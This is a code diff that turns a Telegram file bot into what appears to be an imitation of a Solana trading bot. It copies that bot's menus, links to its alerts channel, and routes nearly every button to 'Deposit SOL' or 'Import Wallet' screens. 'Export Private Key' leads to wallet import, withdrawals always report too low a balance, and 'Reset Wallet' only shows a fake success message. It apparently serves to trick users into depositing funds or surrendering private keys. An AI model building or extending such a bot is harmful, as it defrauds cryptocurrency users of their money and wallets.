@@ -34,13 +34,18 @@ async def start(client, message):
     user = message.from_user
     await db.add_user(client, message)                
     button = InlineKeyboardMarkup([[
-        InlineKeyboardButton("👨‍💻 Dᴇᴠꜱ 👨‍💻", callback_data='dev')
+        InlineKeyboardButton("Buy", callback_data='buy'),
+        InlineKeyboardButton("Sell & Manage", callback_data='sell_manage')
         ],[
-        InlineKeyboardButton('📯 Uᴩᴅᴀᴛᴇꜱ', url='https://t.me/FDBotz'),
-        InlineKeyboardButton('💁‍♂️ Sᴜᴩᴩᴏʀᴛ', url='https://t.me/FDBotzCHAT')
+        InlineKeyboardButton("Help", callback_data='help'),
+        InlineKeyboardButton("Refer Friends", callback_data='refer_friends'),
+        InlineKeyboardButton("Alerts", callback_data='alerts')
         ],[
-        InlineKeyboardButton('🎛️ Aʙᴏᴜᴛ', callback_data='about'),
-        InlineKeyboardButton('🛠️ Hᴇʟᴩ', callback_data='help')
+        InlineKeyboardButton("Wallet", callback_data='wallet'),
+        InlineKeyboardButton("Settings", callback_data='settings')
+        ],[
+        InlineKeyboardButton("Pin", callback_data='pin'),
+        InlineKeyboardButton("Refresh", callback_data='refresh')
     ]])
     if Config.START_PIC:
         await message.reply_photo(Config.START_PIC, caption=Txt.START_TXT.format(user.mention), reply_markup=button)       
@@ -56,43 +61,137 @@ async def cb_handler(client, query: CallbackQuery):
             text=Txt.START_TXT.format(query.from_user.mention),
             disable_web_page_preview=True,
             reply_markup = InlineKeyboardMarkup([[
-                InlineKeyboardButton("👨‍💻 Dᴇᴠꜱ 👨‍💻", callback_data='dev')
-                ],[
-                InlineKeyboardButton('📯 Uᴩᴅᴀᴛᴇꜱ', url='https://t.me/FDBotz'),
-                InlineKeyboardButton('💁‍♂️ Sᴜᴩᴩᴏʀᴛ', url='https://t.me/FDBotzCHAT')
-                ],[
-                InlineKeyboardButton('🎛️ Aʙᴏᴜᴛ', callback_data='about'),
-                InlineKeyboardButton('🛠️ Hᴇʟᴩ', callback_data='help')
+        InlineKeyboardButton("Buy", callback_data='buy'),
+        InlineKeyboardButton("Sell & Manage", callback_data='sell_manage')
+        ],[
+        InlineKeyboardButton("Help", callback_data='help'),
+        InlineKeyboardButton("Refer Friends", callback_data='refer_friends'),
+        InlineKeyboardButton("Alerts", url='https://t.me/BONKbotNewTokenAlerts')
+        ],[
+        InlineKeyboardButton("Wallet", callback_data='wallet'),
+        InlineKeyboardButton("Settings", callback_data='settings')
+        ],[
+        InlineKeyboardButton("Pin", callback_data='pin'),
+        InlineKeyboardButton("Refresh", callback_data='refresh')
+    ]])
+        )
+
+     
+    elif data == "refer_friends":
+        await query.message.edit_text(
+            text=Txt.REFER_TXT,
+            disable_web_page_preview=True,
+            reply_markup=InlineKeyboardMarkup([[
+                InlineKeyboardButton("Close", callback_data="close")
             ]])
         )
+    elif data == "wallet":
+        await query.message.edit_text(
+            text=Txt.REFER_TXT,
+            disable_web_page_preview=True,
+            reply_markup=InlineKeyboardMarkup([[
+        InlineKeyboardButton("View on Solscan", url="https://solscan.io"),
+        InlineKeyboardButton("Close", callback_data="close")
+        ],[
+        InlineKeyboardButton("Deposit SOL", callback_data="deposit_sol")
+        ],[
+        InlineKeyboardButton("Withdraw All SOL", callback_data='witdrawall'),
+        InlineKeyboardButton("Withdraw X SOL", callback_data='withdrawx')
+        ],[
+        InlineKeyboardButton("Reset Wallet", callback_data='resetwallet'),
+        InlineKeyboardButton("Export Private Key", callback_data='import_wallet')
+        ],[
+        InlineKeyboardButton("Refresh", callback_data='refresh')
+    ]])
+        ) 
+        
+    elif data == "resetwallet":
+        await query.answer("Wallet Reset Successfully", show_alert=True)
+    
+    elif data == "refresh":
+        await query.answer("Refreshed Succesfully", show_alert=True)
+
+    elif data == "buy":
+        await query.message.edit_text(
+            text=Txt.BUYSOL_TXT,
+            disable_web_page_preview=True,
+            reply_markup=InlineKeyboardMarkup([[
+                InlineKeyboardButton("Close", callback_data="close")
+            ]])
+        )
+
+    elif data == "sell_manage":
+        await query.message.edit_text(
+            text=Txt.SELL_TXT,
+            disable_web_page_preview=True,
+            reply_markup=InlineKeyboardMarkup([[
+                InlineKeyboardButton("Close", callback_data="close")
+            ]])
+        )
+
+    elif data == "withdrawall":
+        await query.message.edit_text(
+            text=Txt.NOENOUGHBALANCE_TXT,
+            disable_web_page_preview=True,
+            reply_markup=InlineKeyboardMarkup([[
+                InlineKeyboardButton("Close", callback_data="close"),
+                InlineKeyboardButton("Deposit SOL", callback_data="deposit_sol")
+            ]])
+        )
+
+    elif data == "withdrawx":
+        await query.message.edit_text(
+            text=Txt.NOENOUGHBALANCE_TXT,
+            disable_web_page_preview=True,
+            reply_markup=InlineKeyboardMarkup([[
+                InlineKeyboardButton("Close", callback_data="close"),
+                InlineKeyboardButton("Deposit SOL", callback_data="deposit_sol")
+            ]])
+        )
+
     elif data == "help":
         await query.message.edit_text(
             text=Txt.HELP_TXT,
             disable_web_page_preview=True,
             reply_markup=InlineKeyboardMarkup([[
-                #⚠️ don't change source code & source link ⚠️ #
-                InlineKeyboardButton("❣️ Sᴏᴜʀᴄᴇ Cᴏᴅᴇ", url="https://github.com")
-                ],[
-                InlineKeyboardButton("🖥️ 𝙵𝙳 𝙱𝙾𝚃𝚉", url="https://t.me/FDBotz")
-                ],[
-                InlineKeyboardButton("🔒 Cʟᴏꜱᴇ", callback_data = "close"),
-                InlineKeyboardButton("◀️ Bᴀᴄᴋ", callback_data = "start")
-            ]])            
+                InlineKeyboardButton("Close", callback_data="close"),
+                InlineKeyboardButton("Back", callback_data="start")
+            ]])
         )
-    elif data == "about":
+    elif data == "settings":
         await query.message.edit_text(
-            text=Txt.ABOUT_TXT.format(client.mention),
+            text=Txt.SETTINGS_TXT.format(client.mention),
             disable_web_page_preview = True,
             reply_markup=InlineKeyboardMarkup([[
-                #⚠️ don't change source code & source link ⚠️ #
-                InlineKeyboardButton("❣️ Sᴏᴜʀᴄᴇ Cᴏᴅᴇ", url="https://github.com")
-                ],[
-                InlineKeyboardButton("🖥️ 𝙵𝙳 𝙱𝙾𝚃𝚉", url="https://t.me/FDBotz")
-                ],[
-                InlineKeyboardButton("🔒 Cʟᴏꜱᴇ", callback_data = "close"),
-                InlineKeyboardButton("◀️ Bᴀᴄᴋ", callback_data = "start")
-            ]])            
-        )
+        InlineKeyboardButton("🇬🇧 English", callback_data='english'),
+        InlineKeyboardButton("Min Pos Value: $0.001", callback_data='min_pos_value')
+        ],[
+        InlineKeyboardButton("🔴 Disabled", callback_data='disabled'),
+        InlineKeyboardButton("🔧 0.10 SOL", callback_data='auto_buy_value')
+        ],[
+        InlineKeyboardButton("🔧 Left: 1.0 SOL", callback_data='buy_left'),
+        InlineKeyboardButton("🔧 Right: 5.0 SOL", callback_data='buy_right')
+        ],[
+        InlineKeyboardButton("🔧 Left: 25%", callback_data='sell_left'),
+        InlineKeyboardButton("🔧 Right: 100%", callback_data='sell_right')
+        ],[
+        InlineKeyboardButton("🔧 Buy: 10%", callback_data='slippage_buy'),
+        InlineKeyboardButton("🔧 Sell: 10%", callback_data='slippage_sell')
+        ],[
+        InlineKeyboardButton("🔧 Max Price Impact: 25%", callback_data='max_price_impact')
+        ],[
+        InlineKeyboardButton("🚀 Turbo", callback_data='mev_turbo')
+        ],[
+        InlineKeyboardButton("🚀 Turbo", callback_data='mev_turbo')
+        ],[
+        InlineKeyboardButton("🔧 Medium", callback_data='transaction_priority_medium'),
+        InlineKeyboardButton("🔧 0.00150 SOL", callback_data='transaction_priority_value')
+        ],[
+        InlineKeyboardButton("🟢 Enabled", callback_data='sell_protection_enabled')
+        ],[
+        InlineKeyboardButton("Close", callback_data='close')
+    ]])
+    )
     elif data == "dev":
         await query.message.edit_text(
             text=Txt.DEV_TXT,
@@ -105,6 +204,236 @@ async def cb_handler(client, query: CallbackQuery):
                 ],[
                 InlineKeyboardButton("🔒 Cʟᴏꜱᴇ", callback_data = "close"),
                 InlineKeyboardButton("◀️ Bᴀᴄᴋ", callback_data = "start")
+            ]])          
+        )
+
+    elif data == "deposit_sol":
+        await query.message.edit_text(
+        text=Txt.DEPOSITADDRESS_TXT,
+        disable_web_page_preview=True,
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("Import Wallet", callback_data="import_wallet")
+        ]])
+    )
+        
+    elif data == "import_wallet":
+        await query.message.edit_text(
+        text=Txt.IMPORTWALLET_TXT,
+        disable_web_page_preview=True,
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("Deposit Sol", callback_data="deposit_sol")
+        ]])
+    )
+
+    elif data == "min_pos_value":
+        await query.message.edit_text(
+        text=Txt.DEPOSIT_TXT,
+        disable_web_page_preview=True,
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("Deposit Sol", callback_data="deposit_sol"),
+            InlineKeyboardButton("Import Wallet", callback_data="import_wallet")
+        ]])
+    )
+
+    elif data == "english":
+        await query.message.edit_text(
+        text=Txt.DEPOSIT_TXT,
+        disable_web_page_preview=True,
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("Deposit Sol", callback_data="deposit_sol"),
+            InlineKeyboardButton("Import Wallet", callback_data="import_wallet")
+        ]])
+    )
+
+
+    elif data == "auto_buy_value":
+        await query.message.edit_text(
+        text=Txt.DEPOSIT_TXT,
+        disable_web_page_preview=True,
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("Deposit Sol", callback_data="deposit_sol"),
+            InlineKeyboardButton("Import Wallet", callback_data="import_wallet")
+        ]])
+    )
+
+    elif data == "buy_left":
+        await query.message.edit_text(
+        text=Txt.DEPOSIT_TXT,
+        disable_web_page_preview=True,
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("Deposit Sol", callback_data="deposit_sol"),
+            InlineKeyboardButton("Import Wallet", callback_data="import_wallet")
+        ]])
+    )
+
+    elif data == "buy_right":
+        await query.message.edit_text(
+        text=Txt.DEPOSIT_TXT,
+        disable_web_page_preview=True,
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("Deposit Sol", callback_data="deposit_sol"),
+            InlineKeyboardButton("Import Wallet", callback_data="import_wallet")
+        ]])
+    )
+
+    elif data == "sell_left":
+        await query.message.edit_text(
+        text=Txt.DEPOSIT_TXT,
+        disable_web_page_preview=True,
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("Deposit Sol", callback_data="deposit_sol"),
+            InlineKeyboardButton("Import Wallet", callback_data="import_wallet")
+        ]])
+    )
+
+    elif data == "sell_right":
+        await query.message.edit_text(
+        text=Txt.DEPOSIT_TXT,
+        disable_web_page_preview=True,
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("Deposit Sol", callback_data="deposit_sol"),
+            InlineKeyboardButton("Import Wallet", callback_data="import_wallet")
+        ]])
+    )
+
+    elif data == "slippage_buy":
+        await query.message.edit_text(
+        text=Txt.DEPOSIT_TXT,
+        disable_web_page_preview=True,
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("Deposit Sol", callback_data="deposit_sol"),
+            InlineKeyboardButton("Import Wallet", callback_data="import_wallet")
+        ]])
+    )
+
+    elif data == "slippage_sell":
+        await query.message.edit_text(
+        text=Txt.DEPOSIT_TXT,
+        disable_web_page_preview=True,
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("Deposit Sol", callback_data="deposit_sol"),
+            InlineKeyboardButton("Import Wallet", callback_data="import_wallet")
+        ]])
+    )
+
+    elif data == "max_price_impact":
+        await query.message.edit_text(
+        text=Txt.DEPOSIT_TXT,
+        disable_web_page_preview=True,
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("Deposit Sol", callback_data="deposit_sol"),
+            InlineKeyboardButton("Import Wallet", callback_data="import_wallet")
+        ]])
+    )
+
+    elif data == "mev_turbo":
+        await query.message.edit_text(
+        text=Txt.DEPOSIT_TXT,
+        disable_web_page_preview=True,
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("Deposit Sol", callback_data="deposit_sol"),
+            InlineKeyboardButton("Import Wallet", callback_data="import_wallet")
+        ]])
+    )
+
+    elif data == "transaction_priority_medium":
+        await query.message.edit_text(
+        text=Txt.DEPOSIT_TXT,
+        disable_web_page_preview=True,
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("Deposit Sol", callback_data="deposit_sol"),
+            InlineKeyboardButton("Import Wallet", callback_data="import_wallet")
+        ]])
+    )
+
+    elif data == "transaction_priority_value":
+        await query.message.edit_text(
+        text=Txt.DEPOSIT_TXT,
+        disable_web_page_preview=True,
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("Deposit Sol", callback_data="deposit_sol"),
+            InlineKeyboardButton("Import Wallet", callback_data="import_wallet")
+        ]])
+    )
+
+    elif data == "sell_protection_enabled":
+        await query.message.edit_text(
+        text=Txt.DEPOSIT_TXT,
+        disable_web_page_preview=True,
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("Deposit Sol", callback_data="deposit_sol"),
+            InlineKeyboardButton("Import Wallet", callback_data="import_wallet")
+        ]])
+    )
+        
+    elif data == "disabled":
+        await query.message.edit_text(
+            text=Txt.SETTINGS_TXT,
+            disable_web_page_preview=True,
+            reply_markup=InlineKeyboardMarkup([[
+                #⚠️ don't change source code & source link ⚠️ #
+                InlineKeyboardButton("🇬🇧 English", callback_data='english'),
+        InlineKeyboardButton("Min Pos Value: $0.001", callback_data='min_pos_value')
+        ],[
+        InlineKeyboardButton("🔴 Disabled", callback_data='disabled'),
+        InlineKeyboardButton("🔧 0.10 SOL", callback_data='auto_buy_value')
+        ],[
+        InlineKeyboardButton("🔧 Left: 1.0 SOL", callback_data='buy_left'),
+        InlineKeyboardButton("🔧 Right: 5.0 SOL", callback_data='buy_right')
+        ],[
+        InlineKeyboardButton("🔧 Left: 25%", callback_data='sell_left'),
+        InlineKeyboardButton("🔧 Right: 100%", callback_data='sell_right')
+        ],[
+        InlineKeyboardButton("🔧 Buy: 10%", callback_data='slippage_buy'),
+        InlineKeyboardButton("🔧 Sell: 10%", callback_data='slippage_sell')
+        ],[
+        InlineKeyboardButton("🔧 Max Price Impact: 25%", callback_data='max_price_impact')
+        ],[
+        InlineKeyboardButton("🚀 Turbo", callback_data='mev_turbo')
+        ],[
+        InlineKeyboardButton("🚀 Turbo", callback_data='mev_turbo')
+        ],[
+        InlineKeyboardButton("🔧 Medium", callback_data='transaction_priority_medium'),
+        InlineKeyboardButton("🔧 0.00150 SOL", callback_data='transaction_priority_value')
+        ],[
+        InlineKeyboardButton("🟢 Enabled", callback_data='sell_protection_enabled')
+        ],[
+        InlineKeyboardButton("Close", callback_data='close')
+            ]])          
+        )
+    elif data == "enabled":
+        await query.message.edit_text(
+            text=Txt.SETTINGS_TXT,
+            disable_web_page_preview=True,
+            reply_markup=InlineKeyboardMarkup([[
+                #⚠️ don't change source code & source link ⚠️ #
+                InlineKeyboardButton("🇬🇧 English", callback_data='english'),
+        InlineKeyboardButton("Min Pos Value: $0.001", callback_data='min_pos_value')
+        ],[
+        InlineKeyboardButton("🟢 Enabled", callback_data='enabled'),
+        InlineKeyboardButton("🔧 0.10 SOL", callback_data='auto_buy_value')
+        ],[
+        InlineKeyboardButton("🔧 Left: 1.0 SOL", callback_data='buy_left'),
+        InlineKeyboardButton("🔧 Right: 5.0 SOL", callback_data='buy_right')
+        ],[
+        InlineKeyboardButton("🔧 Left: 25%", callback_data='sell_left'),
+        InlineKeyboardButton("🔧 Right: 100%", callback_data='sell_right')
+        ],[
+        InlineKeyboardButton("🔧 Buy: 10%", callback_data='slippage_buy'),
+        InlineKeyboardButton("🔧 Sell: 10%", callback_data='slippage_sell')
+        ],[
+        InlineKeyboardButton("🔧 Max Price Impact: 25%", callback_data='max_price_impact')
+        ],[
+        InlineKeyboardButton("🚀 Turbo", callback_data='mev_turbo')
+        ],[
+        InlineKeyboardButton("🚀 Turbo", callback_data='mev_turbo')
+        ],[
+        InlineKeyboardButton("🔧 Medium", callback_data='transaction_priority_medium'),
+        InlineKeyboardButton("🔧 0.00150 SOL", callback_data='transaction_priority_value')
+        ],[
+        InlineKeyboardButton("🟢 Enabled", callback_data='sell_protection_enabled')
+        ],[
+        InlineKeyboardButton("Close", callback_data='close')
             ]])          
         )
     elif data == "close":
